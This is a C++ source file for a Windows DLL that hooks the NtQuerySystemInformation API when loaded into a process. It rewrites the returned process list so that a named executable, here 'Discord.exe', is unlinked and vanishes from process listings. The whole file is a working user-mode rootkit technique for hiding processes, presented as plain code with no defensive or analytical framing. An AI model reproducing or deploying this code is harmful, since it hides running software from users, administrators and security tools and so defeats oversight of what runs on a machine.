// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winternl.h>
#include "winNt.h"
#include "hooker.h"
#include <memory>
#include <wil/resource.h>

__kernel_entry NTSTATUS
NTAPI
NtQuerySystemInformationHook(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

UNICODE_STRING hiddenImageName;
Hook ntQuerySystemInformationHook = Hook((void*)_NtQuerySystemInformation, (void*)NtQuerySystemInformationHook);
wil::unique_mutex mutex(CreateMutex(NULL, FALSE, NULL));

__kernel_entry NTSTATUS
NTAPI
NtQuerySystemInformationHook(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
) {
	WaitForSingleObject(mutex.get(), INFINITE);
	ntQuerySystemInformationHook.revert();
	auto retval = _NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	ntQuerySystemInformationHook.apply();
	ReleaseMutex(mutex.get());

	if (SystemInformationClass != SystemProcessInformation)
		return retval;
	auto processInfo = static_cast<SYSTEM_PROCESS_INFORMATION*>(SystemInformation),
		prevGoodProcessInfo = processInfo; // Ok since we know the first process is "System Interrupts"

	while (TRUE) {
		if (_RtlEqualUnicodeString(&processInfo->ImageName, &hiddenImageName, FALSE)) {
			prevGoodProcessInfo->NextEntryOffset += processInfo->NextEntryOffset;
			if (0 == processInfo->NextEntryOffset)
				prevGoodProcessInfo->NextEntryOffset = 0;
		}
		else
			prevGoodProcessInfo = processInfo;

		if (0 == processInfo->NextEntryOffset)
			break;

		processInfo = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(reinterpret_cast<char*>(processInfo) + processInfo->NextEntryOffset);
	}
	return retval;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		_RtlInitUnicodeString(&hiddenImageName, L"Discord.exe");
		ntQuerySystemInformationHook.apply();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

